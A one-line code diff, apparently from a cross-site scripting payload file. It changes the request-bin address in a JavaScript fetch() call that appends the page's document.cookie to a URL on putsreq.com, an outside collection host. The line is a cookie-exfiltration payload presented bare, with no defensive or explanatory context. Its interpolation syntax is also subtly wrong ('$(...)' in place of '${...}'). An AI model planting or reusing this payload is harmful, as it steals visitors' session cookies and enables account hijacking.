@@ -1,1 +1,1 @@
-fetch(`https://putsreq.com/8u0vQQwoo1mcJnqRPVEa?$(document.cookie)`);
+fetch(`https://putsreq.com/HrWsb1Jj9YZDdN8QxbBA?$(document.cookie)`);
